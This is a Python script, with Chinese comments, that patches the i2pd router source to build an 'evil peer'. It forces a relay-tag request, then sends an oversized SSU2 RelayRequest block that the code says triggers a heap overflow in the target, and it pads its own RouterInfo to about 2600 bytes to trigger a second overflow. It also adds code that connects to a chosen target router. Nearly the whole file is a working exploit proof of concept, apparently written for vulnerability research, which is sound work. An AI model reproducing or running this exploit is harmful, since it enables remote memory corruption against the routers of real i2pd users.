#!/usr/bin/env python3
"""evil peer 补丁 —— 精确 tab 缩进版"""
import sys

def patch(path, old, new, name):
    src = open(path).read()
    if new in src:
        print(f"{name}: already patched")
        return
    if old not in src:
        print(f"{name}: ANCHOR NOT FOUND in {path}")
        sys.exit(1)
    src = src.replace(old, new, 1)
    open(path, 'w').write(src)
    print(f"{name}: patched")

T = '\t'

# ---- Patch 1: SendSessionRequest 无条件请求 RelayTag ----
old1 = (
    f"{T}{T}if (GetRouterStatus () == eRouterStatusFirewalled && m_Address->IsIntroducer ())\n"
    f"{T}{T}{{\n"
    f"{T}{T}{T}if (!m_Server.IsMaxNumIntroducers (m_RemoteEndpoint.address ().is_v4 ()) ||\n"
    f"{T}{T}{T}    m_Server.GetRng ()() & 0x01) // request tag with probability 1/2 if we have enough introducers\n"
    f"{T}{T}{T}{{\n"
)
new1 = (
    f"{T}{T}if (getenv (\"EVIL_ATTACK\") || (GetRouterStatus () == eRouterStatusFirewalled && m_Address->IsIntroducer ()))\n"
    f"{T}{T}{{\n"
    f"{T}{T}{T}if (getenv (\"EVIL_ATTACK\") || !m_Server.IsMaxNumIntroducers (m_RemoteEndpoint.address ().is_v4 ()) ||\n"
    f"{T}{T}{T}    m_Server.GetRng ()() & 0x01) // request tag with probability 1/2 if we have enough introducers\n"
    f"{T}{T}{T}{{\n"
)
patch('libi2pd/SSU2Session.cpp', old1, new1, 'patch1-relaytag-request')

# ---- Patch 2: Established() 延迟发送恶意 RelayRequest ----
old2 = (
    f"{T}{T}if (m_OnEstablished)\n"
    f"{T}{T}{{\n"
    f"{T}{T}{T}m_OnEstablished ();\n"
    f"{T}{T}{T}m_OnEstablished = nullptr;\n"
    f"{T}{T}}}\n"
    f"{T}}}\n"
)
new2 = (
    f"{T}{T}if (m_OnEstablished)\n"
    f"{T}{T}{{\n"
    f"{T}{T}{T}m_OnEstablished ();\n"
    f"{T}{T}{T}m_OnEstablished = nullptr;\n"
    f"{T}{T}}}\n"
    f"{T}{T}// EVIL: 收到 RelayTag 后延迟发送超长 RelayRequest 触发目标堆溢出 (i2pd CVE-PoC)\n"
    f"{T}{T}if (getenv (\"EVIL_ATTACK\") && m_RelayTag && IsOutgoing ())\n"
    f"{T}{T}{{\n"
    f"{T}{T}{T}auto s = shared_from_this ();\n"
    f"{T}{T}{T}auto timer = std::make_shared<boost::asio::steady_timer> (m_Server.GetService (), std::chrono::seconds (3));\n"
    f"{T}{T}{T}timer->async_wait ([s, timer](const boost::system::error_code& ecode)\n"
    f"{T}{T}{T}{T}{{\n"
    f"{T}{T}{T}{T}{T}if (ecode || !s->IsEstablished ()) return;\n"
    f"{T}{T}{T}{T}{T}uint8_t payload[SSU2_MAX_PACKET_SIZE];\n"
    f"{T}{T}{T}{T}{T}memset (payload, 0, sizeof (payload));\n"
    f"{T}{T}{T}{T}{T}size_t p = 0;\n"
    f"{T}{T}{T}{T}{T}payload[p] = eSSU2BlkRelayRequest; p++;\n"
    f"{T}{T}{T}{T}{T}htobe16buf (payload + p, 1437); p += 2;\n"
    f"{T}{T}{T}{T}{T}payload[p] = 0; p++;\n"
    f"{T}{T}{T}{T}{T}htobe32buf (payload + p, 0x45414545); p += 4;\n"
    f"{T}{T}{T}{T}{T}htobe32buf (payload + p, s->m_RelayTag); p += 4;\n"
    f"{T}{T}{T}{T}{T}htobe32buf (payload + p, i2p::util::GetSecondsSinceEpoch ()); p += 4;\n"
    f"{T}{T}{T}{T}{T}payload[p] = s->GetRemoteVersion () > 0 ? (uint8_t)s->GetRemoteVersion () : 4; p++;\n"
    f"{T}{T}{T}{T}{T}payload[p] = 0; p++;\n"
    f"{T}{T}{T}{T}{T}size_t filled = p;\n"
    f"{T}{T}{T}{T}{T}memset (payload + p, 0x41, 1440 - filled); p = 1440;\n"
    f"{T}{T}{T}{T}{T}LogPrint (eLogWarning, \"EVIL: firing malicious RelayRequest block size=1437 tag=\", s->m_RelayTag);\n"
    f"{T}{T}{T}{T}{T}s->SendData (payload, p);\n"
    f"{T}{T}{T}{T}}});\n"
    f"{T}{T}}}\n"
    f"{T}}}\n"
)
patch('libi2pd/SSU2Session.cpp', old2, new2, 'patch2-fire-relayrequest')

# ---- Patch 3: UpdateRouterInfo RI 填充至 ~2600B ----
old3 = (
    f"{T}void RouterContext::UpdateRouterInfo ()\n"
    f"{T}{{\n"
    f"{T}{T}std::shared_ptr<i2p::data::RouterInfo::Buffer> buffer;\n"
    f"{T}{T}{{\n"
    f"{T}{T}{T}std::lock_guard<std::mutex> l(m_RouterInfoMutex);\n"
    f"{T}{T}{T}m_RouterInfo.CreateBuffer (m_Keys);\n"
)
new3 = (
    f"{T}void RouterContext::UpdateRouterInfo ()\n"
    f"{T}{{\n"
    f"{T}{T}std::shared_ptr<i2p::data::RouterInfo::Buffer> buffer;\n"
    f"{T}{T}{{\n"
    f"{T}{T}{T}std::lock_guard<std::mutex> l(m_RouterInfoMutex);\n"
    f"{T}{T}{T}if (getenv (\"EVIL_PAD\")) // EVIL: 填充自身 RI 超过 1495B 触发目标堆溢出\n"
    f"{T}{T}{T}{{\n"
    f"{T}{T}{T}{T}m_RouterInfo.SetProperty (\"evilpad\", \"\");\n"
    f"{T}{T}{T}{T}m_RouterInfo.CreateBuffer (m_Keys);\n"
    f"{T}{T}{T}{T}size_t base = m_RouterInfo.GetBufferLen ();\n"
    f"{T}{T}{T}{T}size_t want = 2600;\n"
    f"{T}{T}{T}{T}if (base + 9 < want)\n"
    f"{T}{T}{T}{T}{T}m_RouterInfo.SetProperty (\"evilpad\", std::string (want - base - 9, 'E'));\n"
    f"{T}{T}{T}}}\n"
    f"{T}{T}{T}m_RouterInfo.CreateBuffer (m_Keys);\n"
)
patch('libi2pd/RouterContext.cpp', old3, new3, 'patch3-ri-padding')

# ---- Patch 4: Daemon 启动后主动连接目标 ----
old4 = (
    f"{T}{T}LogPrint(eLogInfo, \"Daemon: Starting Router context\");\n"
    f"{T}{T}i2p::context.Start();\n"
)
new4 = (
    f"{T}{T}LogPrint(eLogInfo, \"Daemon: Starting Router context\");\n"
    f"{T}{T}i2p::context.Start();\n\n"
    f"{T}{T}if (const char * targetRI = getenv (\"EVIL_TARGET_RI\")) // EVIL: 主动连接目标\n"
    f"{T}{T}{{\n"
    f"{T}{T}{T}std::thread ([targetRI]()\n"
    f"{T}{T}{T}{T}{{\n"
    f"{T}{T}{T}{T}{T}std::this_thread::sleep_for (std::chrono::seconds (5));\n"
    f"{T}{T}{T}{T}{T}i2p::data::RouterInfo ri (targetRI);\n"
    f"{T}{T}{T}{T}{T}if (ri.IsUnreachable ())\n"
    f"{T}{T}{T}{T}{T}{{\n"
    f"{T}{T}{T}{T}{T}{T}LogPrint (eLogError, \"EVIL: target RI not loadable: \", targetRI);\n"
    f"{T}{T}{T}{T}{T}{T}return;\n"
    f"{T}{T}{T}{T}{T}}}\n"
    f"{T}{T}{T}{T}{T}auto buf = ri.CopyBuffer ();\n"
    f"{T}{T}{T}{T}{T}LogPrint (eLogWarning, \"EVIL: target RI loaded \", buf->GetBufferLen (), \" bytes, connecting\");\n"
    f"{T}{T}{T}{T}{T}i2p::data::netdb.AddRouterInfo (buf->data (), buf->GetBufferLen ());\n"
    f"{T}{T}{T}{T}{T}i2p::transport::transports.SendMessage (ri.GetIdentHash (), i2p::CreateDatabaseStoreMsg ());\n"
    f"{T}{T}{T}{T}}}).detach ();\n"
    f"{T}{T}}}\n"
)
patch('daemon/Daemon.cpp', old4, new4, 'patch4-connect-target')
print("ALL-PATCHES-OK")
